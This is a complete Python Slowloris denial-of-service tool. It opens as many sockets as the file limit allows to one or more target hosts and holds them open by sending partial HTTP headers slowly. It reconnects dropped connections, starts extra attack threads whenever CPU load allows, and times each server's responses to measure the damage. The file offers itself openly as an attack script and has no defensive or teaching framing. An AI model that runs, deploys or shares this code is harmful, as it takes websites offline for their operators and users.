import socket
import random
import time
import logging
import threading
import argparse
import requests
import yaml
import os
import re
import psutil
import resource
from time import perf_counter

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def load_config():
    config_path = os.path.join(os.path.dirname(__file__), "config.yaml")
    with open(config_path, "r") as file:
        return yaml.safe_load(file)

config = load_config()
user_agents = config['user_agents']

def generate_random_cookie():
    cookie_values = ['session_id', 'auth_token', 'pref', 'id']
    cookie_str = ""
    for cookie in cookie_values:
        value = random.randint(1000, 9999)
        cookie_str += f"{cookie}={value}; "
    return cookie_str.strip()

def clean_host(host):
    return re.sub(r'^https?://', '', host).strip()

def init_socket(ip, port, max_retries, timeout):
    retry_count = 0
    while retry_count < max_retries:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((ip, port))
            s.send(f"GET /?{random.randint(0, 10000)} HTTP/1.1\r\n".encode("utf-8"))
            s.send(f"Host: {ip}\r\n".encode("utf-8"))
            s.send(f"User-Agent: {random.choice(user_agents)}\r\n".encode("utf-8"))
            s.send(f"Cookie: {generate_random_cookie()}\r\n".encode("utf-8"))
            s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
            return s
        except socket.error as e:
            retry_count += 1
            logging.warning(f"Socket-Fehler beim Verbinden ({retry_count}/{max_retries}): {e}")
            time.sleep(1)
    return None

def send_slowloris_headers(s):
    try:
        s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
        time.sleep(random.uniform(0.5, 1.5)) 
    except socket.error as e:
        logging.warning(f"Fehler beim Senden von Daten: {e}")
        return False
    return True

def keep_sockets_alive(ip, port, num_sockets, max_retries, timeout, wait_time):
    sockets = []
    logging.info(f"Starting Slowloris attack on {ip}:{port} with {num_sockets} sockets.")

    for _ in range(num_sockets):
        s = init_socket(ip, port, max_retries, timeout)
        if s:
            sockets.append(s)

    while True:
        logging.info(f"Sending headers slowly to {len(sockets)} sockets on {ip}...")
        for s in list(sockets):
            success = send_slowloris_headers(s)
            if not success:
                sockets.remove(s)
                logging.warning(f"Verbindung zu {ip} verloren. Socket entfernt.")

        while len(sockets) < num_sockets:
            s = init_socket(ip, port, max_retries, timeout)
            if s:
                sockets.append(s)
                logging.info(f"Socket zu {ip} wiederhergestellt.")

        time.sleep(wait_time)
      
def check_server_response(ip):
    clean_ip = clean_host(ip)
    url = f"http://{clean_ip}"
    while True:
        try:
            start_time = perf_counter()
            response = requests.get(url)
            end_time = perf_counter()
            response_time = end_time - start_time
            logging.info(f"Server {ip} responded in {response_time:.2f} seconds with status code {response.status_code}.")
        except requests.RequestException as e:
            logging.warning(f"Fehler bei der Verbindung zu Server {ip}: {e}")
        time.sleep(10)

def monitor_cpu_and_spawn_instances(hosts, port, num_sockets, max_retries, timeout, wait_time, max_cpu_load=1.0):
    cpu_cores = psutil.cpu_count(logical=True)
    max_allowed_load = cpu_cores * max_cpu_load 
    while True:
        current_load = psutil.cpu_percent(interval=1)
        logging.info(f"Current CPU load: {current_load}% (Max allowed: {max_allowed_load}%)")

        if current_load < max_allowed_load:
            logging.info("CPU load below target, starting new Slowloris instance...")
            for host in hosts:
                threading.Thread(target=keep_sockets_alive, args=(host, port, num_sockets, max_retries, timeout, wait_time)).start()
        else:
            logging.info("CPU load is above target, waiting...")

        time.sleep(5)

def get_max_open_files():
    soft_limit, hard_limit = resource.getrlimit(resource.RLIMIT_NOFILE)
    logging.info(f"Soft limit for open files: {soft_limit}, Hard limit: {hard_limit}")
    return soft_limit

def main():
    max_open_files = get_max_open_files()
    default_sockets = max_open_files - 50

    parser = argparse.ArgumentParser(description="Slowloris Attack Script with Server Response Time Check, Cookie Support, and CPU Load Management")
    parser.add_argument("-H", "--hosts", type=str, required=True, help="Comma-separated list of hosts to attack (e.g., host1,host2,host3)")
    parser.add_argument("-p", "--port", type=int, default=80, help="Port to attack (default: 80)")
    parser.add_argument("-r", "--max-retries", type=int, default=5, help="Maximum number of retries (default: 5)")
    parser.add_argument("-t", "--timeout", type=float, default=4, help="Socket timeout in seconds (default: 4)")

    parser.add_argument(
        "-n", "--num-sockets",
        type=int,
        default=default_sockets,
        help="Number of sockets to open (default: max_open_files - 50)"
    )

    parser.add_argument("-w", "--wait", type=int, default=15, help="Time to wait between sending headers (default: 15 seconds)")
    parser.add_argument("--cpu-load", type=float, default=1.0, help="Maximum CPU load to allow (default: 1.0, i.e., 100% of CPU cores)")

    args = parser.parse_args()

    hosts = [clean_host(host.strip()) for host in args.hosts.split(",")]

    cpu_monitor_thread = threading.Thread(target=monitor_cpu_and_spawn_instances, args=(hosts, args.port, args.num_sockets, args.max_retries, args.timeout, args.wait, args.cpu_load))
    cpu_monitor_thread.start()

    for host in hosts:
        response_thread = threading.Thread(target=check_server_response, args=(host,))
        response_thread.start()

if __name__ == "__main__":
    main()
